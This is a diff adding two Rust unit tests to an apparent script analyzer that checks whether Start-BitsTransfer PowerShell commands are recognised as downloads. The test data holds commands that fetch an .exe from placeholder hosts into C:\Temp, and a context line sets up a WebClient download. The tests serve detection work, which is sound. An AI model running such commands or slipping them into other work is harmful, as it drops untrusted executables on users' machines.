@@ -8306,6 +8306,45 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn start_bitstransfer_destination_before_source_is_bounded() {
+        let ps = r#"Start-BitsTransfer -Destination C:\Temp\bits.exe -Source https://bits-order.example/bits.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://bits-order.example/bits.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\bits.exe")
+            )
+        });
+        assert!(
+            has,
+            "BITS destination before source was not bounded: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_bitstransfer_destination_abbreviation_extracted() {
+        let ps =
+            r#"Start-BitsTransfer -Dest C:\Temp\bits.exe -S https://bits-alias.example/bits.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://bits-alias.example/bits.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\bits.exe")
+            )
+        });
+        assert!(
+            has,
+            "BITS -Dest abbreviation was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn raw_powershell_downloadfile_variable_url_extracted() {
         let script = r#"$clnt = New-Object System.Net.WebClient
 $url = "http://download.example/tool.exe"
